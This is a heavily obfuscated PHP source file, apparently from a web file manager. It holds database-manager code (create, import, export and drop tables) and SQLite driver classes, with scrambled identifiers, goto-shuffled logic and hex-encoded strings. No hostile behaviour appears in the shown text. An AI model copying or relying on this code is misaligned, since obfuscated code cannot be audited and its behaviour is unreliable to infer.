getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($FˆÛŠÖøÏ) { return addslashes($FˆÛŠÖøÏ); } public function setModel($d…£â×Òâ”) { $this->model = $d…£â×Òâ”; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Aƒâ–˜Ö‰­, $A¥§†ğéŸæ = '') { $this->database = $Aƒâ–˜Ö‰­; $this->type = $A¥§†ğéŸæ; } public function model($FÄÓâãÅ±· = '') { return new ModelBase($FÄÓâãÅ±·, $_SERVER[í™][33], $this->database); } public function db($E§‚®°»Ê = false) { goto fàÏê½î›£; C²ö“øŠÌº: $FæõîğĞ×¸ = $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[870]]; $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[870]] = $b»Œ•ƒ¼Ô¿[33]; if ($b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[704]] == $b»Œ•ƒ¼Ô¿[705]) { $bæùí—Šº¶ = $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[706]]; $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[706]] = substr($bæùí—Šº¶, 0, strrpos($bæùí—Šº¶, $b»Œ•ƒ¼Ô¿[958])); } goto aÖ‡ÜØ‚Ù; Bô½˜‘©‹: $this->database = $b÷ÅÕÑìŠ¤; $E¸–Ä÷‚ã±->execute("\x75\x73\145\x20\x60{$FæõîğĞ×¸}\x60"); return $E¸–Ä÷‚ã±; goto E×èàÃ È”; a½„„¡ÎâÉ: if (!$dğß™ƒç„) { $E¸–Ä÷‚ã±->execute("\143\x72\145\x61\x74\x65\40\144\141\164\x61\x62\x61\x73\145\x20\x60{$FæõîğĞ×¸}\140"); } $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[870]] = $FæõîğĞ×¸; if ($b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[704]] == $b»Œ•ƒ¼Ô¿[705]) { $b÷ÅÕÑìŠ¤[$b»Œ•ƒ¼Ô¿[706]] .= $b»Œ•ƒ¼Ô¿[958] . $FæõîğĞ×¸; } goto Bô½˜‘©‹; aÖ‡ÜØ‚Ù: $this->database = $b÷ÅÕÑìŠ¤; $E¸–Ä÷‚ã± = $this->model()->db(); try { $dğß™ƒç„ = $E¸–Ä÷‚ã±->execute("\163\150\x6f\x77\40\144\141\164\141\x62\141\x73\x65\x73\x20\154\x69\153\x65\x20\x27{$FæõîğĞ×¸}\x27"); } catch (Exception $CïØ²çŞÎ‹) { } goto a½„„¡ÎâÉ; fàÏê½î›£: $b»Œ•ƒ¼Ô¿ =& $_SERVER[í™]; $b÷ÅÕÑìŠ¤ = array_change_key_case($this->database); if ($this->type == $b»Œ•ƒ¼Ô¿[9] || !$E§‚®°»Ê) { return $this->model()->db(); } goto C²ö“øŠÌº; E×èàÃ È”: } public function createTable($DèÇÜ·ˆöÖ, $eÛ°Õ÷Œñ = null) { $aß¢ïô›¹ =& $_SERVER[í™]; if (!IO::exist($DèÇÜ·ˆöÖ)) { ActionCall($aß¢ïô›¹[959], !0, 0); show_json(LNG($aß¢ïô›¹[960]), !1); } $eÙòßÜÔ•É = sqlSplit(IO::getContent($DèÇÜ·ˆöÖ)); foreach ($eÙòßÜÔ•É as $D£®†óøîÍ) { if ($eÛ°Õ÷Œñ) { $C³ÒËÊÂÕÜ = stripos($D£®†óøîÍ, $aß¢ïô›¹[961]) === 0; if ($C³ÒËÊÂÕÜ) { $eÛ°Õ÷Œñ->task[$aß¢ïô›¹[962]] += 1; } } $this->model()->db()->execute($D£®†óøîÍ); if ($eÛ°Õ÷Œñ && $C³ÒËÊÂÕÜ) { preg_match($aß¢ïô›¹[963], $D£®†óøîÍ, $bâ³ö…Æ…); $eÛ°Õ÷Œñ->task[$aß¢ïô›¹[964]] = $bâ³ö…Æ…[1]; $eÛ°Õ÷Œñ->update(1); } } $this->taskToCache($eÛ°Õ÷Œñ); } public function insertTable($BˆÏ×• –, $F„Èç·¨ = null) { $dì…àªË =& $_SERVER[í™]; $e˜›²¶†ÛÄ = $this->model()->db(); $E•ª¿–¥²‰ = $F‡÷®­åÛ ? array($F‡÷®­åÛ) : $e˜›²¶†ÛÄ->getTables(); foreach ($BˆÏ×• – as $d×È†Ó×¹) { $F‡÷®­åÛ = basename($d×È†Ó×¹, $dì…àªË[699]); if (!in_array($F‡÷®­åÛ, $E•ª¿–¥²‰)) { continue; } if ($F„Èç·¨) { $F„Èç·¨->task[$dì…àªË[964]] = $F‡÷®­åÛ; } if (get_filesize($d×È†Ó×¹) == 0) { continue; } $E®ğ‡ªºÎµ = $this->sqlToDb($d×È†Ó×¹, $F„Èç·¨); if (!$E®ğ‡ªºÎµ) { ActionCall($dì…àªË[959], !0, 0); show_json(LNG($dì…àªË[965]) . "\133{$F‡÷®­åÛ}\x5d", !1); } } $this->taskToCache($F„Èç·¨); } public function sqlFromDb($A´•½ÖùÜ, $E³óƒ‡, $c•™è§¥Ï² = null, $Dê¹Ï¯Õæ¨ = null) { goto D¨¨Áó™‡; c‚îğî·È: $B™Â•Ø—¯ = $aˆ¡†ìá“£->getPk(); $F¼½óÁ¢åÊ = $aˆ¡†ìá“£->getDbFields(); do { $fÑœ›÷  = $aˆ¡†ìá“£->field($F¼½óÁ¢åÊ)->order($B™Â•Ø—¯ . $_SERVER[í™][967])->selectPage($föÖ¢ÑÂÔ, $bÃ—ôÑø÷‰); $CÁÃ‚­İğç = isset($fÑœ›÷ [$_SERVER[í™][351]][$_SERVER[í™][353]]) ? $fÑœ›÷ [$_SERVER[í™][351]][$_SERVER[í™][353]] : 0; $bÓç¿¯ÃçÆ = !empty($fÑœ›÷ [$_SERVER[í™][354]]) ? $fÑœ›÷ [$_SERVER[í™][354]] : array(); if (!($CÖ”ËÄÇ = count($bÓç¿¯ÃçÆ))) { break; } $føÒ”ŠªÀ = array(); foreach ($bÓç¿¯ÃçÆ as $a¯‹–Š¼ç) { if ($A´•½ÖùÜ == $_SERVER[í™][968] && $a¯‹–Š¼ç[$_SERVER[í™][29]] == $_SERVER[í™][969]) { $cÁãä©Ìè­ = json_decode($a¯‹–Š¼ç[$_SERVER[í™][359]], !0); if ($cÁãä©Ìè­[$_SERVER[í™][28]] == date($_SERVER[í™][672]) && !$cÁãä©Ìè­[$_SERVER[í™][671]]) { continue; } } if ($Dê¹Ï¯Õæ¨) { $a¯‹–Š¼ç[$_SERVER[í™][75]] = "\x7b\x69\157\x3a{$Dê¹Ï¯Õæ¨}\x7d" . substr($a¯‹–Š¼ç[$_SERVER[í™][75]], strlen("\x7b\x69\157\x3a{$a¯‹–Š¼ç[$_SERVER[í™][725]]}\x7d")); $a¯‹–Š¼ç[$_SERVER[í™][725]] = $Dê¹Ï¯Õæ¨; } $føÒ”ŠªÀ[] = $_SERVER[í™][970] . $this->sqlEncode($a¯‹–Š¼ç) . $_SERVER[í™][971]; } $Cõã´â‡´ = "\x49\x4e\123\x45\122\124\40\111\x4e\124\117\40\x60{$A´•½ÖùÜ}\x60\40\x28\x60" . implode($_SERVER[í™][972], $F¼½óÁ¢åÊ) . $_SERVER[í™][973]; fwrite($d„ò¡ôÒ¨ø, $Cõã´â‡´ . implode($_SERVER[í™][974], $føÒ”ŠªÀ) . $_SERVER[í™][67] . PHP_EOL); $bÃ—ôÑø÷‰++; $Bœò¾ŸÏ¶ += $CÖ”ËÄÇ; if ($c•™è§¥Ï²) { $c•™è§¥Ï²->update($CÖ”ËÄÇ); } } while ($bÃ—ôÑø÷‰ <= $CÁÃ‚­İğç); goto eŞÅë¨¼èÅ; fó’È“İä’: $bÃ—ôÑø÷‰ = 1; $föÖ¢ÑÂÔ = 500; $d„ò¡ôÒ¨ø = fopen($E³óƒ‡, $_SERVER[í™][966]); goto c‚îğî·È; D¨¨Áó™‡: if ($c•™è§¥Ï²) { $c•™è§¥Ï²->task[$_SERVER[í™][964]] = $A´•½ÖùÜ; } $aˆ¡†ìá“£ = $this->model($A´•½ÖùÜ); $Bœò¾ŸÏ¶ = 0; goto fó’È“İä’; eŞÅë¨¼èÅ: fclose($d„ò¡ôÒ¨ø); return $Bœò¾ŸÏ¶; goto aÙº†ôòÌ¨; aÙº†ôòÌ¨: } public function sqlToDb($A¤‡›°ØÑñ, $F¼öÇã®ö¿ = null) { goto eÂ°¡Á¾­Š; B°ÓœÛ±İÀ: $B«„µäùÌ• = 500 + 1; while (!feof($aÚõæµï®)) { if ($F¼öÇã®ö¿ && $f°’Æáê¥ != 0) { $F¼öÇã®ö¿->task[$dÃ“‡áåñ–[962]] += 1; } $f°’Æáê¥++; $dÕàÒ‚í‚é = trim(fgets($aÚõæµï®)); $eÔ‡Ïáˆ£ .= $dÃ“‡áåñ–[50] . $this->sqlDecode($dÕàÒ‚í‚é, $this->type); if ($f°’Æáê¥ == $B«„µäùÌ•) { $eÔ‡Ïáˆ£ = rtrim(trim($eÔ‡Ïáˆ£), $dÃ“‡áåñ–[67]); if (!$bôùÌøİÎâ->execute($eÔ‡Ïáˆ£)) { return !1; } if ($F¼öÇã®ö¿) { $F¼öÇã®ö¿->update($f°’Æáê¥ - 1); } $eÔ‡Ïáˆ£ = $dÃ“‡áåñ–[33]; $f°’Æáê¥ = 0; } } fclose($aÚõæµï®); goto EªÃ„­Ó±†; eÂ°¡Á¾­Š: $dÃ“‡áåñ– =& $_SERVER[í™]; $bôùÌøİÎâ = $this->model()->db(); $aÚõæµï® = @fopen($A¤‡›°ØÑñ, $dÃ“‡áåñ–[975]); goto fŒĞİ˜ø°¹; fŒĞİ˜ø°¹: if (!$aÚõæµï®) { return !1; } $f°’Æáê¥ = 0; $eÔ‡Ïáˆ£ = $dÃ“‡áåñ–[33]; goto B°ÓœÛ±İÀ; EªÃ„­Ó±†: if (trim($eÔ‡Ïáˆ£)) { $eÔ‡Ïáˆ£ = rtrim(trim($eÔ‡Ïáˆ£), $dÃ“‡áåñ–[67]); if (!$bôùÌøİÎâ->execute($eÔ‡Ïáˆ£)) { return !1; } if ($F¼öÇã®ö¿) { $F¼öÇã®ö¿->update($f°’Æáê¥ - 1); } } return !0; goto Aó££¤Ö­; Aó££¤Ö­: } public function dropTable($FÁ§¥¹İ˜š = null) { $FÍëéƒëÛœ = $this->model()->db(); $AŸš‡—âÉŞ = $FÁ§¥¹İ˜š ? array($FÁ§¥¹İ˜š) : $FÍëéƒëÛœ->getTables(); if (!$AŸš‡—âÉŞ) { return; } foreach ($AŸš‡—âÉŞ as $FÁ§¥¹İ˜š) { $FÍëéƒëÛœ->execute("\144\162\x6f\x70\40\x74\x61\x62\154\x65\40\151\146\40\x65\170\151\163\x74\163\40\x60{$FÁ§¥¹İ˜š}\x60"); } } private function taskToCache($C³Îì†ºö = null) { $A¿´øš†òò =& $_SERVER[í™]; if (!$C³Îì†ºö) { return; } $b¦¢„ªÚÙÇ = array($A¿´øš†òò[964] => $C³Îì†ºö->task[$A¿´øš†òò[964]], $A¿´øš†òò[962] => $C³Îì†ºö->task[$A¿´øš†òò[962]], $A¿´øš†òò[976] => $C³Îì†ºö->task[$A¿´øš†òò[976]]); if ($b¦¢„ªÚÙÇ[$A¿´øš†òò[962]] == $b¦¢„ªÚÙÇ[$A¿´øš†òò[976]]) { $b¦¢„ªÚÙÇ[$A¿´øš†òò[678]] = 1; } Cache::set($A¿´øš†òò[977] . $C³Îì†ºö->task[$A¿´øš†òò[367]], $b¦¢„ªÚÙÇ); $C³Îì†ºö->end(); } private function sqlEncode($Cù§ñ†Û¶ï) { $F˜Şõ çã£ =& $_SERVER[í™]; $FõÃ‘À±çÁ = array(); foreach ($Cù§ñ†Û¶ï as $a“¬İÈ§Êç) { if (is_array($a“¬İÈ§Êç)) { $a“¬İÈ§Êç = json_encode_force($a“¬İÈ§Êç); } $a“¬İÈ§Êç = addslashes($a“¬İÈ§Êç); $a“¬İÈ§Êç = str_replace(array($F˜Şõ çã£[978], $F˜Şõ çã£[217]), array($F˜Şõ çã£[979], $F˜Şõ çã£[980]), $a“¬İÈ§Êç); $FõÃ‘À±çÁ[] = str_replace($F˜Şõ çã£[55], $F˜Şõ çã£[981], $a“¬İÈ§Êç); } return $F˜Şõ çã£[55] . implode($F˜Şõ çã£[982], $FõÃ‘À±çÁ) . $F˜Şõ çã£[55]; } private function sqlDecode($F„»‹Ñ Ú‹, $C™Š·ˆí•¤) { $Bß‡ÌàÈ× =& $_SERVER[í™]; $F„»‹Ñ Ú‹ = str_replace(array($Bß‡ÌàÈ×[979], $Bß‡ÌàÈ×[980]), array($Bß‡ÌàÈ×[978], $Bß‡ÌàÈ×[217]), $F„»‹Ñ Ú‹); if ($C™Š·ˆí•¤ == $Bß‡ÌàÈ×[9]) { $F„»‹Ñ Ú‹ = stripslashes($F„»‹Ñ Ú‹); } return $F„»‹Ñ Ú‹; } } goto E–‡ìãÊ“ª; B‹Íë‰´ù: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Eºôõ†ÈĞ³; cªÖôåô¸—: $this->in =& $in; $this->values[$B¯¸î¢·¹Ù[6]] =& $config; $this->values[$B¯¸î¢·¹Ù[7]] =& $in; goto E×öµ»ÚÈ‡; E×öµ»ÚÈ‡: $this->tpl = TEMPLATE . MOD . $B¯¸î¢·¹Ù[8]; $this->_classObjectID = mt_rand(0, 10000); goto F‘¡‹ÇÇğ; Eºôõ†ÈĞ³: $B¯¸î¢·¹Ù =& $_SERVER[í™]; global $in, $config; $this->config =& $config; goto cªÖôåô¸—; F‘¡‹ÇÇğ: } public function loadClass($BêââªğÑ) { if (1 === func_num_args()) { $this->{$BêââªğÑ} = new $BêââªğÑ(); } else { $fõ³ÙìÆ²Ë = new ReflectionClass($BêââªğÑ); $DÂ‰È£´ÓÅ = func_get_args(); array_shift($DÂ‰È£´ÓÅ); $this->{$BêââªğÑ} = $fõ³ÙìÆ²Ë->newInstanceArgs($DÂ‰È£´ÓÅ); } return $this->{$BêââªğÑ}; } protected function assign($EÂï«òøà×, $Aõ«‚¯íÉƒ) { $this->values[$EÂï«òøà×] = $Aõ«‚¯íÉƒ; } protected function display($cº­°ĞîĞÒ) { ob_end_clean(); extract($this->values); require $this->tpl . $cº­°ĞîĞÒ; } } class DbSqliteBase extends Db { public function __construct($eŞ–Ñöí­ = '') { $B¡Â°Ä ïò =& $_SERVER[í™]; if (!extension_loaded($B¡Â°Ä ïò[9])) { think_exception(think_lang($B¡Â°Ä ïò[10]) . $B¡Â°Ä ïò[11]); } if (!empty($eŞ–Ñöí­)) { if (!isset($eŞ–Ñöí­[$B¡Â°Ä ïò[12]])) { $eŞ–Ñöí­[$B¡Â°Ä ïò[12]] = 438; } $this->config = $eŞ–Ñöí­; if (empty($this->config[$B¡Â°Ä ïò[13]])) { $this->config[$B¡Â°Ä ïò[13]] = array(); } } } public function connect($D¡œ¡„›ƒ„ = '', $B¬…ƒâóò = 0) { $FğÏ´ĞÙáÈ =& $_SERVER[í™]; if (!isset($this->linkID[$B¬…ƒâóò])) { goto fëšš”½»; e‚ƒİŞˆœç: $this->linkID[$B¬…ƒâóò] = $BÀ‡êªªĞ($D¡œ¡„›ƒ„[$FğÏ´ĞÙáÈ[17]], $D¡œ¡„›ƒ„[$FğÏ´ĞÙáÈ[12]]); if (!$this->linkID[$B¬…ƒâóò]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto föÎ©Ú‹; föÎ©Ú‹: @sqlite_busy_timeout($this->linkID[$B¬…ƒâóò], 30000); if (1 != think_config($FğÏ´ĞÙáÈ[18])) { unset($this->config); } goto A“ç Í‹…­; fëšš”½»: if (empty($D¡œ¡„›ƒ„)) { $D¡œ¡„›ƒ„ = $this->config; } $aÇÄ¦ƒÆ¯ = !empty($D¡œ¡„›ƒ„[$FğÏ´ĞÙáÈ[13]][$FğÏ´ĞÙáÈ[14]]) ? $D¡œ¡„›ƒ„[$FğÏ´ĞÙáÈ[13]][$FğÏ´ĞÙáÈ[14]] : $this->pconnect; $BÀ‡êªªĞ = $aÇÄ¦ƒÆ¯ ? $FğÏ´ĞÙáÈ[15] : $FğÏ´ĞÙáÈ[16]; goto e‚ƒİŞˆœç; A“ç Í‹…­: } return $this->linkID[$B¬…ƒâóò]; } public function free() { $this->queryID = null; } public function query($d¥„×ÖİÆÃ) { goto a‰Ïç¨†¬; A½™§Ö×ãô: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $bãããÒº¡ = $this->getAll(); return $bãããÒº¡; } goto DÉôó¬±ˆ¥; a‰Ïç¨†¬: $A¾§‹½¬ó =& $_SERVER[í™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Eá‰¤ÂÖ…Ğ; e¹šµÆùò: think_status($A¾§‹½¬ó[20]); $this->queryID = sqlite_query($this->_linkID, $d¥„×ÖİÆÃ); $this->debug(); goto A½™§Ö×ãô; Eá‰¤ÂÖ…Ğ: $this->queryStr = $d¥„×ÖİÆÃ; if ($this->queryID) { $this->free(); } think_action_status($A¾§‹½¬ó[19], 1); goto e¹šµÆùò; DÉôó¬±ˆ¥: } public function execute($b°³Üßƒ³) { goto a“õœñ˜è•; F‹ˆ·Ü‘ë: if (!1 === $aë·õ°´Ú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto CÛ¨˜›Éó; aºŠ”èÀ‘ä: $this->queryStr = $b°³Üßƒ³; if ($this->queryID) { $this->free(); } think_action_status($fÓ×ª»ŞÂ®[21], 1); goto F¹Å‰åÀ˜Ü; a“õœñ˜è•: $fÓ×ª»ŞÂ® =& $_SERVER[í™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aºŠ”èÀ‘ä; F¹Å‰åÀ˜Ü: think_status($fÓ×ª»ŞÂ®[20]); $aë·õ°´Ú = sqlite_exec($this->_linkID, $b°³Üßƒ³); $this->debug(); goto F‹ˆ·Ü‘ë; CÛ¨˜›Éó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[í™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cº‘Ö»«Ç = sqlite_query($this->_linkID, $_SERVER[í™][23]); if (!$Cº‘Ö»«Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dŞ¥´ôƒ‚ = sqlite_query($this->_linkID, $_SERVER[í™][24]); if (!$dŞ¥´ôƒ‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $b„®åé–‰Ì = array(); if ($this->numRows > 0) { for ($a™ÃÖ™ºï‹ = 0; $a™ÃÖ™ºï‹ < $this->numRows; $a™ÃÖ™ºï‹++) { $b„®åé–‰Ì[$a™ÃÖ™ºï‹] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $b„®åé–‰Ì; } public function getFields($A›íàè‚·) { $Aš‘ç çƒ· =& $_SERVER[í™]; $b¨ ¾ŠÎÛ = $this->query($Aš‘ç çƒ·[25] . $A›íàè‚· . $Aš‘ç çƒ·[26]); $F¥—ÌÅÆ° = array(); if ($b¨ ¾ŠÎÛ) { foreach ($b¨ ¾ŠÎÛ as $A¯ÄĞÍ‘ => $AÕªŒ¸„¢¬) { $F¥—ÌÅÆ°[$AÕªŒ¸„¢¬[$Aš‘ç çƒ·[27]]] = array($Aš‘ç çƒ·[28] => $AÕªŒ¸„¢¬[$Aš‘ç çƒ·[27]], $Aš‘ç çƒ·[29] => $AÕªŒ¸„¢¬[$Aš‘ç çƒ·[30]], $Aš‘ç çƒ·[31] => (bool) ($AÕªŒ¸„¢¬[$Aš‘ç çƒ·[32]] === $Aš‘ç çƒ·[33]), $Aš‘ç çƒ·[34] => $AÕªŒ¸„¢¬[$Aš‘ç çƒ·[35]], $Aš‘ç çƒ·[36] => strtolower($AÕªŒ¸„¢¬[$Aš‘ç çƒ·[37]]) == $Aš‘ç çƒ·[38], $Aš‘ç çƒ·[39] => strtolower($AÕªŒ¸„¢¬[$Aš‘ç çƒ·[40]]) == $Aš‘ç çƒ·[41]); } } return $F¥—ÌÅÆ°; } public function getTables($Cë¤ñš¿‰Ú = '') { $e¡»Õ¾÷ÂØ =& $_SERVER[í™]; $d¦ß«½›Ÿ = $this->query($e¡»Õ¾÷ÂØ[42] . $e¡»Õ¾÷ÂØ[43] . $e¡»Õ¾÷ÂØ[44]); $d÷Ì¥ªíß = array(); foreach ($d¦ß«½›Ÿ as $Däó·Ÿ×Äã => $f†®¿ä¡Ş) { $d÷Ì¥ªíß[$Däó·Ÿ×Äã] = current($f†®¿ä¡Ş); } return $d÷Ì¥ªíß; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $aª‡……ò÷ =& $_SERVER[í™]; $BÉ¿æ£Ä’ = sqlite_last_error($this->_linkID); $this->error = $BÉ¿æ£Ä’ . $aª‡……ò÷[4] . sqlite_error_string($BÉ¿æ£Ä’); if ($aª‡……ò÷[33] != $this->queryStr) { $this->error .= LNG($aª‡……ò÷[45]) . $this->queryStr; } think_trace($this->error, $aª‡……ò÷[33], $aª‡……ò÷[46]); return $this->error; } public function escapeString($cÜÌÊØŒ) { return sqlite_escape_string($cÜÌÊØŒ); } public function parseLimit($E°°ßô„İ) { $D‡¸éÄ²‡† =& $_SERVER[í™]; $aµŸ®¼ä‹¶ = $D‡¸éÄ²‡†[33]; if (!empty($E°°ßô„İ)) { $E°°ßô„İ = explode($D‡¸éÄ²‡†[47], $E°°ßô„İ); if (count($E°°ßô„İ) > 1) { $aµŸ®¼ä‹¶ .= $D‡¸éÄ²‡†[48] . $E°°ßô„İ[1] . $D‡¸éÄ²‡†[49] . $E°°ßô„İ[0] . $D‡¸éÄ²‡†[50]; } else { $aµŸ®¼ä‹¶ .= $D‡¸éÄ²‡†[48] . $E°°ßô„İ[0] . $D‡¸éÄ²‡†[50]; } } return $aµŸ®¼ä‹¶; } } class DbSqlite3Base extends Db { public function __construct($dê­‰ÚÉ‰Ä = '') { $DË·éÆÚ =& $_SERVER[í™]; if (!class_exists($DË·éÆÚ[51])) { think_exception(think_lang($DË·éÆÚ[10]) . $DË·éÆÚ[52]); } if (!empty($dê­‰ÚÉ‰Ä)) { if (!isset($dê­‰ÚÉ‰Ä[$DË·éÆÚ[12]])) { $dê­‰ÚÉ‰Ä[$DË·éÆÚ[12]] = 438; } $this->config = $dê­‰ÚÉ‰Ä; if (empty($this->config[$DË·éÆÚ[13]])) { $this->config[$DË·éÆÚ[13]] = array(); } } } public function connect($EŒ”å…Ğù… = '', $Bƒí‚ĞÄ = 0) { $DÙóçô›ß =& $_SERVER[í™]; if (!isset($this->linkID[$Bƒí‚ĞÄ])) { if (empty($EŒ”å…Ğù…)) { $EŒ”å…Ğù… = $this->config; } $this->linkID[$Bƒí‚ĞÄ] = new SQLite3($EŒ”å…Ğù…[$DÙóçô›ß[17]]); if (!$this->linkID[$Bƒí‚ĞÄ]) { think_exception($this->linkID[$Bƒí‚ĞÄ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Bƒí‚ĞÄ]->busyTimeout(30000); if (1 != think_config($DÙóçô›ß[18])) { unset($this->config); } } return $this->linkID[$Bƒí‚ĞÄ]; } public function free() { $this->queryID = null; } public function query($cŠ££‡ÆŞ) { goto eÖŠì—‹¸î; CçÉØ¦‚²ë: if (!1 === $this->queryID) { $this->error(); return !1; } else { $cõÆÜ¸„ÅÀ = $this->getAll(); $this->numRows = count($cõÆÜ¸„ÅÀ); return $cõÆÜ¸„ÅÀ; } goto e¼Í¢œÓ´™; Bğùß›éŸó: think_status($a­å†Íì¯[20]); $this->queryID = $this->_linkID->query($cŠ££‡ÆŞ); $this->debug(); goto CçÉØ¦‚²ë; eÖŠì—‹¸î: $a­å†Íì¯ =& $_SERVER[í™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fîî›‘ëí°; fîî›‘ëí°: $this->queryStr = $cŠ££‡ÆŞ; if ($this->queryID) { $this->free(); } think_action_status($a­å†Íì¯[19], 1); goto Bğùß›éŸó; e¼Í¢œÓ´™: } public function execute($b‡œ°ß“ˆê) { goto dòÊ™¡Ş„°; F´Ÿ“Ñ‡å: think_status($A›ªè–Ê×[20]); $F¬¥ä§íÏ = $this->_linkID->exec($b‡œ°ß“ˆê); $this->debug(); goto eÜ¯…ñö—; CÈÑòèà›‚: $this->queryStr = $b‡œ°ß“ˆê; if ($this->queryID) { $this->free(); } think_action_status($A›ªè–Ê×[21], 1); goto F´Ÿ“Ñ‡å; eÜ¯…ñö—: if (!1 === $F¬¥ä§íÏ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto dÅÂÕ„ÒŒò; dòÊ™¡Ş„°: $A›ªè–Ê× =& $_SERVER[í™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÈÑòèà›‚; dÅÂÕ„ÒŒò: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[í™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÔâ›Í… = $this->_linkID->query($_SERVER[í™][23]); if (!$aÔâ›Í…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÏŸ‡°‚Ó” = $this->_linkID->query($_SERVER[í™][24]); if (!$eÏŸ‡°‚Ó”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Dàİ·¤ˆä = array(); while ($A¼­è»éƒ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Dàİ·¤ˆä[] = $A¼­è»éƒ; } $this->queryID->reset(); return $Dàİ·¤ˆä; } public function getFields($fŞ††è‹Ò±) { $f©ÍÙÖòì =& $_SERVER[í™]; $EéªÁï¹‘Û = $this->query($f©ÍÙÖòì[25] . $fŞ††è‹Ò± . $f©ÍÙÖòì[26]); $CÀÄ¸¨‹¸¶ = array(); if ($EéªÁï¹‘Û) { foreach ($EéªÁï¹‘Û as $fîò«Ë×œ´ => $FğÎ‚Æö”Ï) { $CÀÄ¸¨‹¸¶[$FğÎ‚Æö”Ï[$f©ÍÙÖòì[28]]] = array($f©ÍÙÖòì[28] => $FğÎ‚Æö”Ï[$f©ÍÙÖòì[28]], $f©ÍÙÖòì[29] => $FğÎ‚Æö”Ï[$f©ÍÙÖòì[29]], $f©ÍÙÖòì[31] => (bool) ($FğÎ‚Æö”Ï[$f©ÍÙÖòì[31]] === $f©ÍÙÖòì[33]), $f©ÍÙÖòì[34] => $FğÎ‚Æö”Ï[$f©ÍÙÖòì[53]], $f©ÍÙÖòì[36] => (bool) $FğÎ‚Æö”Ï[$f©ÍÙÖòì[54]], $f©ÍÙÖòì[39] => (bool) $FğÎ‚Æö”Ï[$f©ÍÙÖòì[54]]); } } return $CÀÄ¸¨‹¸¶; } public function getTables($e„’ÖÄŒˆ” = '') { $aùê”ÃË—‹ =& $_SERVER[í™]; $fÍ–òíÇá = $this->query($aùê”ÃË—‹[42] . $aùê”ÃË—‹[43] . $aùê”ÃË—‹[44]); $b³Œ®¸™’¼ = array(); foreach ($fÍ–òíÇá as $e¬äòÅõ¶ => $e×à±²•éí) { $b³Œ®¸™’¼[$e¬äòÅõ¶] = current($e×à±²•éí); } return $b³Œ®¸™’¼; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÄ°İ§¶ãË =& $_SERVER[í™]; $this->error = $this->_linkID->lastErrorMsg(); if ($dÄ°İ§¶ãË[33] != $this->queryStr) { $this->error .= LNG($dÄ°İ§¶ãË[45]) . $this->queryStr; } think_trace($this->error, $dÄ°İ§¶ãË[33], $dÄ°İ§¶ãË[46]); return $this->error; } public function escapeString($fÉá»×Ëİ) { $Aƒ¬Š¨ƒŒÜ =& $_SERVER[í™]; if ($this->_linkID) { return $this->_linkID->escapeString($fÉá»×Ëİ); } return str_ireplace($Aƒ¬Š¨ƒŒÜ[55], $Aƒ¬Š¨ƒŒÜ[56], $fÉá»×Ëİ); } public function parseLimit($aÇÉğŠ¢øÄ) { $E‘——™öìò =& $_SERVER[í™]; $eÅ„Âììå = $E‘——™öìò[33]; if (!empty($aÇÉğŠ¢øÄ)) { $aÇÉğŠ¢øÄ = explode($E‘——™öìò[47], $aÇÉğŠ¢øÄ); if (count($aÇÉğŠ¢øÄ) > 1) { $eÅ„Âììå .= $E‘——™öìò[48] . $aÇÉğŠ¢øÄ[1] . $E‘——™öìò[49] . $aÇÉğŠ¢øÄ[0] . $E‘——™öìò[50]; } else { $eÅ„Âììå .= $E‘——™öìò[48] . $aÇÉğŠ¢øÄ[0] . $E‘——™öìò[50]; } } return $eÅ„Âììå; } } goto FõØĞÄ¶¯Á; eåîêİø¡Ğ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\145\x5f\150\151\163\x74\157\162\171"; public function addHistory($bµÇŸ‚µÕÔ, $c•’ù²‹ùÑ = '') { $BˆÜ¸Ñß£ß =& $_SERVER[í™]; $FÀšŒ’”ÜÑ = array($BˆÜ¸Ñß£ß[383] => $bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[369]], $BˆÜ¸Ñß£ß[1414] => isset($bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[379]]) ? 